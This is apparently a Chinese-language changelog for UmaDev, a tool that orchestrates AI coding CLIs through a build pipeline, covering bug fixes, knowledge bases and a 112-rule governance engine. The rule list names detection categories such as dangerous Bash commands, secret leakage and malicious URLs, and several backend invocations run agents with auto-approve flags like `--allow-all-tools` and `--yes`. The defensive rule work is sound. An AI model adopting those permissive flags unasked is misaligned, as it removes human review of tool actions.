- **[LOW] `/antigravity` 提交不可用后端**：特判一个 `driver_for` 构建不出的后端,写进 config 让下次 run 永久坏。删除特判。
- **[MEDIUM] `/deploy` 交互式登录在 alt-screen 下不可见会挂**：部署子进程 stdin 改 `/dev/null`(首次部署需登录的 CLI 会快速 EOF 失败而非无声卡死)+ 5 分钟超时兜底 + 失败时明确提示"在单独终端 `vercel login` 登录后再 /deploy"。
- **[MEDIUM] `/revise` 在澄清门跳过澄清**：在 ClarifyGate 上 revise 原会跑 Block::Initial(直奔 research/docs,跳过澄清);改为重跑 Block::Clarify 用新需求重新提问;并在 revise 时清掉 active_gate(rework 期间状态栏不再误显旧门)。
- **[LOW] 治理误报**：`example.com` 死豁免(注释已剥离)修为只拦裸主机 `://example.com`、放行 `docs.example.com` 子域;8 位带 alpha 的纯黑白 `#ffffffff/#000000ff` 加入色彩 allowlist。+ 测试。
- **[LOW] 文案/模板畸形**：验收 AC 提示里的字面大空格;**交付说明模板每行被缩进 13 空格**(导致写出的 markdown 标题被渲染成代码块,且可能让 /deploy 解析不到 `## Deploy command`)——改用续行符,输出 0 缩进 6 个正常标题。
- OpenAI `base_url` 缺 `/v1` 的 footgun:尝试自动补 `/v1` 会破坏"裸主机根路径直供"的代理(实测打挂 4 个测试),故**不自动改写**,改在 `url()` 注释与 /provider 向导里明确要求带 `/v1`。
- 审查确认大量链路 clean:gate 暂停/恢复/revise 重跑、state 原子写/快照回滚、质量门→交付阻断、宿主 session resume/arg 构造/流式解析、检索 segment 过滤(已修前缀 bug)、契约解析、BM25 索引、TUI 输入编辑 CJK 光标。**1367 测试 0 失败**,clippy/fmt 干净。

### 修复 — 上线前 QA 加固（3 路并行深度审计 + 黑盒全命令矩阵）

对全工作区做了系统 bug 审计（agent / TUI / binary·host·governance 三路并行 + CLI 全命令与边界黑盒测试），修复全部 ship-blocker、崩溃与逻辑缺陷：

- **[CRITICAL] TUI 渲染 `•` 项目符号必崩**（ui.rs `markdown_to_lines` 在 3 字节 `•` 上按字节 `[2..]` 切片）——底座/对话回复几乎都含 `•` 列表，等于一回复就崩。改用 `strip_prefix` + 回归测试。
- **[CRITICAL] 子进程超时形同虚设**（host `run_subprocess` 在 `child.wait()` 超时前**无界 `read_to_end`**）——底座 CLI 写了输出后挂起会让 UmaDev 永久卡死。改为两管道并发读 + 单一 `tokio::time::timeout` 包裹读+等，超时杀进程 + 回归测试。
- **[HIGH] 多字节输入崩溃**：`/bug`（按字节 120 切 CJK 历史）、`/provider key`（按字节 8 切多字节 key，且 key 已落盘后才崩）、`/runs`/`render_lesson_markdown`（时间戳/first_seen 字节切片）——全部改 `chars().take(n)`，杜绝 UTF-8 边界 panic。
- **[MEDIUM] 鉴权覆盖门假阴性**：`endpoint_is_public` 子串匹配把 `POST /api/admin/login-history` 误判为公开（含 "login"）而漏过鉴权检查。改为**按路径段/词元精确匹配** + 回归测试。
- **[MEDIUM] 踩坑效能误判**：被自愈标记 `proven_fix` 的踩坑复发时未被降级，仍显示"已验证"。修复：复发即清 `proven_fix` 置 `Recurring`，并对齐 capture/resolve 的签名表示（修复未识别错误的验证记账无效问题）。
- **[MEDIUM] 治理 hook 违反 fail-open**：未知 check 名 `bail!` 退出码 1 且无决策 JSON（宿主可能当作硬阻断）。改为 fail-open 输出 `allow` + stderr 告警。
- **[MEDIUM] skill 安装误导提示**："Rules enabled: N" 实际从未写入——改为诚实的"规则已声明（默认生效）"。
- **[LOW] 其它加固**：截断/未闭合代码块逃过 HTTP 运行时治理扫描（补扫尾块）；`umadev run ""` 空需求改为友好拒绝。
- 黑盒验证无崩溃：全 CLI 子命令 + 边界（空/特殊字符/超长/坏参/缺文件）、治理 hook（emoji/颜色/.env/危险命令拦截正常）、mcp/skill/knowledge 管理、gate 状态机（revise/rollback）、doctor/ci。
- 审计确认 clean（无 bug）：输入编辑核心(CJK 光标)、picker 索引、provider 向导、slash 解析、会话恢复参数、merge_prompt、BACKEND_IDS 同步、治理 fail-open、verify.rs 子进程生命周期、state.rs 原子写。
- 结果：**1342 测试 0 失败**（+3 回归），clippy `-D warnings` 干净，fmt 干净，e2e 流水线产出 proof pack。

### 新增 — 自学习踩坑知识库 (开发报错自动识别→记录→精准触发→效能闭环)

- **错误识别器** (`umadev-agent::error_kb`): 纯函数、无新依赖。把原始报错文本归类到 14 个错误家族（依赖缺失/包管理冲突/权限/类型不匹配/undefined 访问/Rust panic/端口占用/CORS/连接拒绝/HTTP 状态/环境变量/语法/测试/构建工具）+ 通用兜底，给出根因与修复建议。signature 归一化（剥离路径/行号/十六进制）→ 同类错误同签名。
- **自动捕获**: 流水线运行中实时抓取失败的工具调用 (`StreamEvent::ToolResult{ok:false}`) 与构建/lint/测试非零退出 (`VerifyOutcome.stderr`)，全程 fail-open，捕获即提示 `[learned] 识别并记录了 N 条开发踩坑`。
- **频率 + 技术栈上下文记录**: 复发不丢弃而是 `occurrences++`（频率=重要性）；捕获时打上技术栈指纹（扫 `package.json`/`Cargo.toml` 依赖名）。
- **精准触发（上下文指纹交集）**: 召回用技术栈指纹而非需求 prose 匹配——坑的判别符（如 `react-router-dom`）出现在当前项目依赖里才触发，与需求措辞无关；按频率+新近度加权。
- **效能闭环（自验证 / 自愈）**: 注入即快照命中数；下次仍复发→标记 `Recurring` 并在提示词中升级警告"上次已警示仍复发，需更彻底的方案"；警示后不再复发→`Validated`（修复有效，降噪）。
- **跨项目"一次过"**: 识别出家族的踩坑首次出现即晋升全局 `~/.umadev/learned/`，换项目也记得。
- **在线修复增强**: 构建失败时，`maybe_verify_and_fix` 把 error_kb 的诊断（根因+修法）一并喂给 worker，让单次修复更可能成功。
- **可见性**: `umadev report` 显示踩坑库自验证统计；TUI `/pitfalls` 概览全部踩坑（状态/频率/技术栈/修法）。

### 新增 — 商业级工程规范知识（分层 / 分包 / 服务层 / API / 数据 / 配置 / 安全 / 测试）

注入到底座开发提示词的**工程标准库**——决定底座产出代码的架构水平。**38 份**框架无关、可执行（含 MUST/MUST-NOT + 反模式 + 最低交付 checklist）的标准，覆盖 结构 / 横切关注点 / 高频商业功能 / 后台CRUD / 体验合规 / Web 框架官方实践 / 后端框架地道写法 / 微服务分布式 / AI 应用 / SEO / 数据增长 / 多端平台工程+设计 / 上架审核，注入每一个构建阶段。

> **标准库发现指针**：后端/前端阶段提示词正文**保证注入**一份标准库速查（列出可查阅的标准），让底座始终知道库里有哪些标准、何时查哪份——即使某标准未被 BM25 注入也能主动检索应用。专家方法论(backend/frontend-lead)也内置同款速查。

> **检索调优**：随标准库增长（37 份/数百 chunk），知识检索 `top_k` 由 6 提升到 **12**——多功能项目能同时注入多个相关标准而不被挤掉；结构纪律另由提示词强制 + 专家方法论双通道保证，不依赖检索排序。

其中通用 + web 相关：

- **应用分层与分包**（backend）：四层模型(接口/应用/领域/基础设施)+依赖向内、服务层怎么写(无状态/用例粒度/事务边界/收发DTO不泄露entity)、DTO/Entity/Domain/VO 区分、依赖倒置、package-by-feature 目录骨架。
- **前端架构与分层**（frontend）：按 feature 分包、展示/容器分离、数据访问层隔离(禁组件裸 fetch)、状态三类分治、业务逻辑下沉 hook。
- **API 与错误处理规范**（backend）：资源命名、状态码、统一错误信封、分页/过滤/排序、版本、幂等、鉴权基线。
- **数据建模与持久化**（backend）：schema/约束、expand-contract 迁移、索引、事务边界、消灭 N+1、软删除、Repository 边界。
- **配置管理与可观测性**（backend）：12-Factor 配置外置、结构化日志(request_id/脱敏)、RED/USE 指标、分布式追踪、健康检查、优雅停机。
- **安全编码基线**（security，对齐 OWASP Top 10）：认证(bcrypt/argon2)、对象级授权(防 IDOR/BOLA)、SQL 参数化、XSS/CSRF、密钥外置、限流、依赖漏洞扫描。
- **测试策略与分层**（testing）：测试金字塔、各层测什么(领域=单元/服务=mock编排/仓储=真DB集成/接口=契约)、AAA、无 flaky、CI 阻断。
- **部署与交付规范**（cicd）：多阶段非root Dockerfile、CI 流水线(lint+test+扫描+质量门阻断)、零停机部署(滚动/蓝绿/金丝雀)、迁移 expand-contract、环境/密钥隔离、一键回滚、随附交付物。
- **性能与可扩展性**（performance）：消灭 N+1、索引/连接池/分页、缓存层次与失效(防击穿/穿透/雪崩)、异步非阻塞+后台队列+超时重试熔断、前端代码分割/懒加载/虚拟化、无状态水平扩展、测量驱动(p95/p99/Core Web Vitals)。
- **高频商业功能标准**（每个商业 app 刚需、AI 最易写错）：
  - **认证与授权实现**（backend）：session vs token 选型、注册/登录(bcrypt+限流)/refresh 旋转/登出、密码重置(防枚举+一次性 token+作废旧会话)、邮箱验证、对象级授权(防 IDOR)+RBAC、OAuth+PKCE。
  - **前端表单与校验**（frontend）：受控/表单库+schema、前端即时+后端兜底校验、字段级错误+422 映射、提交防重复+幂等、loading/error/empty、可访问性(label/aria)。
  - **支付集成**（backend）：金额/状态以服务端为准、webhook 验签+幂等(事件去重)、订单号幂等键防重复扣款、主动查询+定时对账、退款状态机、不存卡号(PCI)+金额整数。
  - **文件上传与存储**（backend）：对象存储+CDN(DB 只存元数据)、预签名直传、大小/类型/真实内容校验+随机重命名+目录不可执行、私有文件鉴权下载。
  - **后台任务与异步**（backend）：耗时入队列、消费幂等+重试退避+死信队列、定时任务多实例去重、outbox 保证消息与事务一致。
  - **邮件与通知**（backend）：专业服务+SPF/DKIM/DMARC、异步发送+幂等、模板+i18n、链接签名过期、多渠道+用户偏好、营销合规可退订。
  - **搜索与过滤**（backend）：按数据量选型(不用 `LIKE %%` 做全文)、GIN/倒排索引、统一搜索 API(白名单参数化)、相关性排序+中文分词+补全、引擎索引异步幂等同步。
  - **实时通信/WebSocket**（backend）：SSE vs WS 选型、握手鉴权+每条消息授权、心跳+指数退避重连+丢消息补偿、多实例共享 Pub/Sub 广播、背压+Presence。
  - **Web 框架官方最佳实践**（frontend · React/Next.js/Vue）：React Hooks/重渲染、**Next App Router**(Server vs Client Components、三层缓存 no-store/revalidate/tags、Suspense 流式/PPR、Server Actions)、Vue Composition API/响应式/Pinia。
  - **AI/LLM 应用**（backend）：供应商抽象+模型分层路由降本、RAG(切分/检索/rerank/来源引用)、**护栏与提示注入防护**(直接+间接/检索内容当数据、工具白名单)、Agent(步数/预算上限防成本炸弹)、LLM-as-judge 评测+可观测。
  - **SEO 与 Web Vitals**（frontend）：SSR/SSG 可索引、title/description/语义化、结构化数据 JSON-LD/OG/hreflang、Core Web Vitals(LCP/CLS/INP)、sitemap/robots/canonical。
  - **数据埋点分析与增长**（backend）：统一事件模型+埋点字典、客户端+服务端双埋(关键转化服务端为准)、漏斗/留存/北极星、A/B 测试、隐私合规(同意/脱敏/ATT)。
  - **后端框架地道写法**（backend · Spring/NestJS/FastAPI/Express/Go）：把通用分层映射到各框架官方惯例(Spring @RestController/@Service/@Transactional/@RestControllerAdvice、NestJS Module/Guards/Pipes/Filters、FastAPI routers/Pydantic/Depends/async、Express 错误中间件、Go clean arch/context/显式 err)。
  - **微服务与分布式**（backend · 中大型）：先模块化单体、DDD 限界上下文拆分、每服务独占库、同步gRPC/异步事件、Saga+Outbox 最终一致、超时重试熔断限流、API 网关/服务发现、分布式追踪。
  - **后台管理与 CRUD 系统**（frontend · 绝大多数 B2B/SaaS 核心）：服务端分页/排序/多条件过滤、批量操作(确认/幂等/进度)、RBAC(前端隐藏+后端强制+数据范围)、操作审计日志+软删除、成熟后台 UI 库+筛选状态保留+异步导出。
- **上架审核 checklist**（cicd · 多端防被拒）：通用隐私/权限、iOS(App Privacy/ATT/Usage Description/IAP)、Android(Data Safety/aab/目标API)、小程序(类目资质/域名白名单)、桌面(签名/公证)、Web(安全头/SEO/监控)。
  - **国际化 i18n/l10n**（frontend）：文案外置走 key、复数/插值用框架、日期/货币/数字用 Intl 按 locale+用户时区、RTL 逻辑属性、locale 检测切换、多语言 SEO。
  - **无障碍 a11y/WCAG AA**（frontend）：语义化 HTML、全键盘可达+可见焦点+弹窗焦点管理、ARIA(aria-invalid/live/label)、对比度≥4.5:1+不只靠颜色、图片 alt、axe/Lighthouse 自测。
- **结构决策传导到 spec 阶段**：执行计划/任务按 feature 模块 + 分层(domain→repository→service→interface→frontend)组织，形成"架构定结构 → spec 拆任务 → 后端/前端照建"的完整传导链。

### 新增 — 多端平台支持（不再只 web：移动/桌面/小程序/鸿蒙/跨平台框架）

修复了 UmaDev **此前实质 web-only** 的盲区——流水线阶段映射不读多端目录、无任何平台标准注入。现已平台感知：

- **流水线平台感知**：retrieve.rs 的 docs/frontend(客户端)阶段新增读取 `mobile/desktop/miniprogram/harmony/cross-platform` 目录；架构阶段提示词新增 `## Target platform & tech stack` 强制声明目标平台与技术栈；客户端阶段提示词新增 "Platform FIRST" 强制按声明平台构建（不默认 web SPA）。
- **6 份多端标准**（seed 下发 + 验证按平台注入）：
  - **平台选型与架构**（cross-platform）：平台选型矩阵、跨端共享架构(业务/数据/契约共享、UI 按各端设计规范)、BFF。
  - **跨平台框架选型**（cross-platform）：Flutter/RN/uni-app/Taro/KMP/MAUI/Capacitor/Tauri/Electron 选型矩阵 + 通用架构 + 原生桥/平台差异/条件编译 + 性能坑。
  - **移动 App**（mobile）：iOS(SwiftUI/HIG)/Android(Compose/Material)/Flutter/RN，MVVM/MVI、生命周期、离线弱网、性能、原生权限/推送/安全存储、商店合规。
  - **鸿蒙 HarmonyOS**（harmony）：Stage 模型(UIAbility)、ArkTS 高性能规则、ArkUI 声明式+状态管理、LazyForEach、HarmonyOS Design、一次开发多端、应用市场合规。
  - **小程序**（miniprogram）：双线程架构、setData 性能优化、分包(主包/预下载/独立)、生命周期、统一请求、登录/支付后端校验、审核合规、uni-app/Taro 跨端。
  - **桌面应用**（desktop）：Tauri vs Electron、主进程/渲染进程 IPC、安全(contextIsolation/allowlist)、系统集成(菜单/托盘/通知)、代码签名+公证、自动更新、多平台打包。
- **5 份官方设计规范**（基于官方文档研究 · 纯底座最易做差的地方）：
  - **iOS 设计规范**（Apple HIG）：Clarity/Deference/Depth/Consistency、SF 字体+Dynamic Type、语义系统色+深色、安全区、Tab≤5/Nav Bar/Modal 导航、SF Symbols(无 emoji)、≥44pt 触控。
  - **Android 设计规范**（Material Design 3）：M3 色角色(seed→palette)+Dynamic Color、type scale、shape/elevation、有意义动效、Material3 组件+Material Symbols、FAB、底部 NavigationBar+系统返回、≥48dp、自适应折叠屏。
  - **鸿蒙设计规范**（HarmonyOS Design）：鸿蒙宇宙视觉语言、鸿蒙 Sans 字体、自适应栅格一次开发多端+折叠屏、ArkUI 系统组件+官方图标库。
  - **微信小程序设计规范**（官方设计指南+WeUI）：尊重知情权/操作权、友好高效一致、即用即走、WeUI 组件+rpx 适配、TabBar≤5、三态+骨架屏+秒开、审核合规。
  - **桌面端设计规范**（macOS HIG / Windows Fluent）：macOS 必有菜单栏(App/File/Edit/View/Window/Help)+Cmd 快捷键、Windows Fluent+Ctrl、不一套 UI 套所有平台、键盘/多窗口/拖放/上下文菜单。
- 效果：声明"安卓/iOS/鸿蒙 App"自动注入移动+鸿蒙+跨平台框架**及对应官方设计规范**；"微信小程序"注入小程序工程+WeUI 设计；"macOS/Windows 桌面"注入桌面工程+HIG/Fluent 设计——底座按目标平台的官方工程+设计规范产出**像原生**的代码，不再千篇一律套 web。
- **嵌入并随项目下发 + 验证注入**：7 份标准全部加入 `umadev init` 的 seed 集（include_str!），新项目自动获得并被 BM25 索引；端到端验证已注入到后端/前端/质量阶段 coach 提示词（score 1.00）。
- **专家方法论硬性底线（始终注入）**：`experts/backend-lead` / `frontend-lead` / `qa-lead` / `devops` / `architect` 方法论新增"结构第一/测试分层/交付底线/结构决策"段，作为动手前必须遵守的底线。
- **提示词级强制结构传导（保证生效，不依赖检索排序）**：架构阶段提示词强制架构文档含 `## Architecture & layering`(四层+依赖向内+服务层规则+feature 模块分解) + API 表加 Auth 列；后端阶段提示词强制"Structure FIRST"——按架构文档的模块/分层建，controller 仅传输、service 用例粒度=事务边界=收发DTO、domain 不贫血、repository 只持久化；前端阶段强制按 feature 分包 + 数据访问层隔离(禁组件裸 fetch) + 状态三类分治。形成"架构定结构 → 后端/前端照建"的闭环。
- **发现并修复**：仓库 `knowledge/` 大量优质工程标准此前**未随项目下发**（init 仅嵌入 21 个文件），新标准已确保走 seed 通道真正到达用户项目。

### 新增 — 质量门安全检查

- **No leaked secrets（硬性失败）**: 质量门新增对交付源码的密钥泄漏扫描，复用治理层 `check_hardcoded_secret`(UD-SEC-003) 作为事后安全网——即使实时写入钩子未安装，也能在交付前拦下硬编码的 API key/密码/连接串凭据。命中即 0 分阻断。跳过依赖/构建产物/文档目录。

### 新增 — 治理引擎 (从 3 条扩展到 112 条规则)

- **安全规则 (UD-SEC-001~031)**: 敏感路径、危险 Bash 命令、硬编码密钥、前端 DB 直连、恶意 URL、npm typosquatting、eval/Function 注入、不安全反序列化、SSRF、CORS 通配符、SQL 注入、XPath 注入、XXE、不安全 cookie、JWT 缺陷、缺失 auth guard、npm audit 集成、开放重定向、不安全 TLS、文件上传无验证、路径穿越、Mass Assignment、响应拆分、信息泄露、prototype pollution、不安全 JSONP、明文密码、localStorage 泄露、document.cookie 访问。
- **架构规则 (UD-ARCH-001~064)**: TypeScript `any`/`!`/`any[]` 禁止、console.log/debugger 残留、API 错误处理、输入校验、React ErrorBoundary、loose array 类型、i18n、a11y 无障碍、rate limiting、结构化日志、CSP/HSTS/helmet/HTTPS、硬编码配置、DB 事务 rollback、bare catch、TOCTOU race、clickjacking 防护、CSRF 保护、GraphQL N+1/深度限制/introspection、WebSocket 认证、硬删除、竞态条件、文件权限、Promise 无 catch、JSON.parse 无 try/catch、postMessage 无 origin 验证、客户端重定向注入、render 副作用、React list key/useEffect cleanup/state mutation/var/loose equality/empty deps/inline handler/wildcard import/untyped props/mutable export/unsafe parse/for...in/unsafe Date 等。
- **语言规则**: Python (bare except/global)、Rust (unwrap)、Go (panic)、Java (System.exit)、Swift (force-unwrap)、Kotlin (!!)、PHP (shell_exec)、Ruby (eval/send)、C/C++ (strcpy/malloc NULL)、Scala (null/return)、R (setwd)、Lua (loadstring)、Perl (eval regex)、Elixir (to_atom)、Haskell (unsafePerformIO)、Clojure (eval)、OCaml (Obj.magic)、F# (null)、Dart (dynamic)。
- **可配置规则引擎**: `.umadev/rules.toml` — 按项目关闭/启用 clause、排除路径 glob、自定义恶意域名。

### 新增 — MCP/Skill/知识库平台

- **MCP 管理** (`umadev mcp-manage install/list/remove`): 安装 MCP 服务器写入 `.mcp.json`，claude code 自动发现。
- **Skill 系统** (`umadev skill install/list/remove`): 知识包 + 规则 + system prompt 一体化安装，自动注入 CLAUDE.md 和 RAG。
- **知识库管理** (`umadev knowledge-manage add/list/search/remove`): 自定义文档进 RAG，BM25 搜索。
- **MCP 治理服务器** (`umadev mcp serve`): 暴露 `govern_file`/`govern_command` 工具给任何 MCP 兼容宿主。
- **coach prompt MCP 注入**: 每个阶段的 coach prompt 自动列出已安装的 MCP 工具。

### 新增 — CI/CD + pre-commit

- **CI 治理** (`umadev ci`): 扫描全 workspace 源文件，违规 exit 1。支持 `--changed-only`/`--report-only`。
- **pre-commit git hook** (`umadev install --host pre-commit`): 本地 commit 前自动跑治理。
- **GitHub Action** (`.github/workflows/umadev-governance.yml`): PR/push 自动治理门。
- **npm audit 集成**: `umadev ci` 自动检测依赖漏洞。

### 新增 — TUI 体验

- **品牌青主题** (#06b6d4): 不再撞 claude code 的橙色。
- **深/浅双主题自适应**: OSC 11 + COLORFGBG 检测终端背景色。
- **终端窗口 >_ 图标**: claude code 风格的图标+文字横排。
- **斜杠命令扩展**: /mcp、/skill、/knowledge 集成。
- **TUI greeting 更新**: 提示 MCP/Skill/知识库扩展能力。

### 新增 — init 完善

- **CLAUDE.md 自动生成**: init 时生成宿主入口文件。
- **.umadev/rules.toml 模板**: init 时生成治理规则配置。
- **.gitignore 自动生成**: 忽略 .umadev/ 和 output/。

### 新增 — HTTP runtime 治理

- **governance_defects**: runner 的 `generate_with_review` 现在扫描 Markdown 代码块，让 HTTP runtime (DeepSeek/Ollama) 宿主的产出也受治理。

### 修复 — 架构适配

- **深度架构审计**: 8 个 crate 依赖图验证、EngineEvent 15 变体全覆盖、跨 crate 接口一致性确认。
- **README/AGENTS.md/greeting 全部更新**: 同步到最新功能。

### 修复 — E2E 流水线验证暴露的 7 个 bug

以下 bug 全部由真实 claude code 9-phase 端到端流水线运行 + puppeteer 自动化测试发现并修复:

- **质量门 checker 只搜 heading**: `review_document_structure` 只在 markdown 标题里搜关键字,导致 `--color`/`--font`/`hover` 等代码块内模式永远检不出。修复:加全文搜索 fallback。(+2 测试)
- **slop checker 禁止语境误判**: `count_slop_violations` 把文档里 `no "lorem ipsum"` 这种**禁止性描述**误判为使用了 slop。修复:检测 prohibition context (`no`/`without`/`avoid`) + 跳过 `quality-gate.md` 报告文件。(+3 测试)
- **API URL checker 不处理反引号路径**: `check_api_url_consistency` 的 `starts_with('/')` 检查无法匹配 LLM 生成的 `` `/api/subscribe` `` 反引号包裹路径。修复:`trim_matches('`')`。
- **contract parser 反引号路径**: `parse_architecture` 同样的反引号问题,导致 OpenAPI contract 无法从架构文档派生。修复:同上。(+1 测试)
- **流水线中断恢复死锁**: `continue` 命令在 phase 中途被中断(超时/进程被杀)后报 "no active gate" 无法恢复,已生成的研究/PRD 被浪费。修复:新增 `infer_gate_from_phase` 根据当前 phase 推断恢复点。(+8 测试)
- **前端深色主题在浅色 OS 下失效**: `tokens.css` 用 `@media (prefers-color-scheme: light)` 自动覆盖 `:root`,违反「深色优先」需求。修复:改为 opt-in `[data-theme="light"]`。
- **移动端水平溢出**: `SignalGlow` 装饰组件 420px 宽在 360px/375px 视口溢出。修复:Hero section 加 `overflow-hidden`。


## [4.6.0] - 2026-06-16

### 修复 — 正确性 bug

- **verify spawn 失败判定反转**:`from_spawn_error` 对*非可跳过*步骤(如 Rust 项目缺 `cargo`)错误返回 `passed=true`,导致缺二进制时静默判通过。改为 `passed=skippable`(只有可跳过工具缺失才中性)。
- **质量门分数取错字段**:`extract_quality_score` 按 `"score"` 切分取第一个,实际抓到的是首个 check 的分数而非 `total_score`。改为解析 `total_score`,并补回归测试。
- **docker-compose YAML 结构错误**:`render_compose` 把 `redis:` 服务块拼到了顶层 `volumes:` 之后,变成 volumes 的子项而非 services 的兄弟项(无效 Compose)。重写为 `services:{app,db,redis}` + `volumes:{pgdata}`,并加结构断言测试。
- **`UD-CODE-005` 归属错误**:`check_ai_slop` 把 AI-slop 检测归到 `UD-CODE-005`,但该 id 在 spec §10 是为 V2 无障碍条款预留的、V1 非规范性,导致 compliance 映射静默丢弃。改归到 `UD-CODE-002`(设计 token)。
- **codex 超时归类不一致**:`CodexDriver` 把所有错误(含超时)都映射成 `HostProcess`,与 claude/simple 不一致,调用方无法识别超时。抽公共 `map_subprocess_error`,三处统一。
- **chunker 死代码**:`split_on_h2` 的 `vec![...]` fallback 表达式被丢弃(尾部 `;`),全空 H2 文档会索引成 0 chunk 而非 1。改为 `return`。
- **frontend 调用去重失效**:`extract.rs` 的 `calls.dedup()` 只去连续重复,跨文件重复调用电无效。改为 `(method,path)` HashSet 去重。

### 改进 — 一致性 & 覆盖

- **CLI `--backend` 覆盖全部 23 个 host**:`BackendArg` 从 11 扩到 23(补 cursor-agent/continue/aider/plandex/cody/goose/amp/junie/grok-build/amazon-q/crush/gptme),并加 `backend_arg_ids_match_host` 测试锁住与 `BACKEND_IDS` 同步——之前 12 个已注册的 driver 从 CLI 不可选。
- **TUI slash 命令覆盖全部 23 个 host**:`try_slash_command` 的 fallback 改为动态识别任何注册 backend id(`/goose` `/amp` `/amazon-q` …),palette 与 did-you-mean 同步从 `BACKEND_IDS` 派生,杜绝漂移。
- **doctor 探测覆盖全部 23 个**:`check_ai_backends` 从 9 个扩到 23 个(含 codebuddy/qoder/kimi 等 TUI 可选但 doctor 漏掉的)。
- **统一 worker 超时旋钮**:`UMADEV_WORKER_TIMEOUT` 之前只有 claude 读,codex/simple 都硬编码 `DEFAULT_TIMEOUT`。抽 `worker_timeout_from_env`,全部 21 个 simple 工厂 + claude + codex 统一读取。
- **hook 工作目录**:缺 `--project-root` 时 `resolve_root` 现在尊重 `CLAUDE_PROJECT_DIR`/`UMADEV_PROJECT_DIR`(作为 hook 调用时之前选错 workspace)。

### 文档 — 统一口径

- 全仓后端数统一为 **23**(README / README_EN / Cargo.toml / CLAUDE.md / guide / examples / `--help` / host crate doc;CHANGELOG 历史条目保持原样)。
- 版本号统一为 **4.6.0**(Cargo.toml + 8 个 path dep / 6 个 npm package.json / README / README_EN / docs/ARCHITECTURE)。

## [4.5.0] - 2026-05-25

### 新增 — 3 个主流 backend(13 个 worker 总覆盖)

继续补全主流 AI 编码 CLI 矩阵,这一轮加 3 个:

| Backend ID | TUI 命令 | 调用形式 | 说明 |
|---|---|---|---|
| **`trae`** | `/trae` | `trae-cli run "<p>"` | ByteDance Trae Agent(注意:**`trae-cli`** 不是 IDE 的 `trae`) |
| **`plandex`** | `/plandex` | `plandex tell --skip-menu --stop "<p>"` | 大上下文(2M tokens)开源 agent,147k stars |
| **`cody`** | `/cody` | `cody chat --message "<p>"` | Sourcegraph 企业级,带代码索引上下文 |

实现:都是 `SimpleHostDriver` 工厂函数,Plandex 因为是 agentic 模式(`tell` 默认会编辑文件)也用了 `STDOUT_ONLY_SUFFIX`(同 Droid)。`BACKEND_IDS.len() == 13` 锁定,`driver_for` 13 路全连。

**研究后跳过的主流 CLI**:
- **Open Interpreter**:`interpreter` 二进制只有交互模式,没有一发即走的 CLI 形式(Python API 才有 `interpreter.chat(...)`),不适合 subprocess 驱动。
- **Cline / Roo Code**:都是 VS Code 扩展,没有独立 CLI。
- **Warp 2.0**:是终端而不是 agent。
- **Codeium / Windsurf**:只是 VS Code 自动补全,没有非交互 CLI。
- **Devin**(Cognition):没有公开 CLI 接口。

### Backend 出厂质量 — 5 个核心 host 完美适配

针对 **claude-code / gemini / codex / droid / opencode** 这 5 个旗舰 backend,逐个端到端真测 + 修发现的所有问题。出厂结论:

| Backend | 状态 | 实测条件 |
|---|---|---|
| `claude-code` | ✓ 完美 | 完整 9 阶段流水线 + proof-pack 落地 + 95/100 质量门 |
| `gemini` | ✓ 完美 | 真实 Linear/Stripe 案例分析,docs_confirm 225 行 LLM 实输出 |
| `droid` | ✓ 完美 | `say hello` 单行干净返回,9 阶段流水线持续验证中 |
| `codex` | ✓ 驱动完美 | 网络可达即开箱可用(需要能访问 `chatgpt.com/backend-api`) |
| `opencode` | ✓ 驱动完美 | 接通 + TUI header 已剥离,LLM 调用速度取决于用户配的 model 提供商 |

### Backend 驱动修复

- **Codex 之前 `codex exec "<p>"` 在非 git 目录会 hang**:加 `--sandbox workspace-write`(headless 必备,否则进入交互 approval 等输入)、`--skip-git-repo-check`(UmaDev workspace 通常不是 git repo)、`--color never`(避免 ANSI 噪声)。
- **Claude Code 驱动加 `--output-format text`**:之前裸 `--print` 在某些版本会返回 JSON 信封。**故意不加 `--bare`**:bare 模式会跳过 OAuth + keychain,要求 `ANTHROPIC_API_KEY` —— 而 UmaDev 全部价值就在于驱动用户**已经登录的订阅**,所以 `--bare` 会反向破坏目标用户。
- **Droid 驱动加 `-o text`**:虽然是文档默认值,显式声明避免未来 Droid 改默认值时回归。
- **OpenCode 输出 sanitize**:`opencode run` 在 stdout 顶部输出 `> build · <model>` TUI 风格头部,UmaDev 在 `SimpleHostDriver::complete()` 里加 backend-specific 后处理(`strip_opencode_header`)剥掉这个头,让喂给下游 phase 的内容只有真实 LLM 文本。
- **CodexDriver / SimpleHostDriver 文档全部更新**:每个 flag 都有"为什么"注释 + 实测验证版本号 + 已知环境依赖。

### 新增 — 8 个新 host backend (10 个 worker 全适配)

之前只接了 Claude Code 和 Codex。这一版把所有主流 AI 编码 CLI 一次性收齐:

| Backend ID | 触发命令 | 调用形式 |
|---|---|---|
| `claude-code` | `/claude` | `claude --print "<prompt>"` |
| `codex` | `/codex` | `codex exec --skip-git-repo-check "<prompt>"` |
| **`gemini`** | `/gemini` | `gemini -p "<prompt>"` (Google Gemini CLI) |
| **`droid`** | `/droid` | `droid exec --auto medium "<prompt>"` (Factory.ai) |
| **`opencode`** | `/opencode` | `opencode run "<prompt>"` (开源,Go) |
| **`cursor-agent`** | `/cursor` | `cursor-agent -p --output-format text "<prompt>"` |
| **`qwen`** | `/qwen` | `qwen -p "<prompt>"` (阿里 Qwen Code,Gemini CLI fork) |
| **`continue`** | `/continue-cli` | `cn -p "<prompt>"` (Continue.dev) |
| **`copilot`** | `/copilot` | `copilot -p --allow-all-tools "<prompt>"` (新版 GitHub Copilot CLI) |
| **`aider`** | `/aider` | `aider --yes --no-stream --message "<prompt>"` |

实现:`crates/umadev-host/src/simple.rs` 加 `SimpleHostDriver` 通用结构,8 个工厂函数 (`droid()` / `opencode()` / `gemini()` / `cursor_agent()` / `qwen()` / `continue_cli()` / `copilot()` / `aider()`) 一次性生成所有新 backend。每个 backend 都支持 `UMADEV_<NAME>_BIN` 环境变量覆盖二进制路径。`probe_all()` 现在并发探测全部 10 个 host(`tokio::join!` 10 路并行)。Picker / `BackendArg` / slash-command 路由全跟上。

### 修复

- **`umadev continue` 不再悄悄掉回 offline 模板。** 原行为:`umadev run "..." --backend claude-code` 跑通 docs_confirm 之后,`umadev continue` 默认回退到 offline,导致 spec/frontend/backend 阶段不再走真 worker。修复:`WorkflowState` 增加 `backend` 字段,`continue` / `revise` 自动复用 `run` 时声明的 worker,新增 `umadev continue --backend <id>` 显式覆盖。
- **`codex` 后端在非 git 目录跑会 fail。** Codex CLI 要求工作目录是 git repo 或显式 `--skip-git-repo-check`。UmaDev workspace 经常只有 `output/` + `.umadev/`,所以 `CodexDriver::base_args()` 默认带上 `--skip-git-repo-check`。
